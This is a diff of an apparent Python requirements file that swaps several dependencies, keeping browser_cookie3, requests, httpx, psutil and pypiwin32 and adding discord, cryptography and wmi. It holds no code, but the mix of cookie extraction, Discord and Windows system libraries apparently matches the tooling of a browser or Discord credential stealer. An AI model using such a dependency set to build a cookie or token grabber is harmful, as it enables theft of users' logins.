@@ -1,10 +1,9 @@
-pyautogui
+psutil
+cryptography
+discord
+httpx
+requests
+pypiwin32
+wmi
 colorama
 browser_cookie3
-requests
-httpx
-pyotp
-psutil
-pypiwin32
-pycryptodome
-PIL-tools
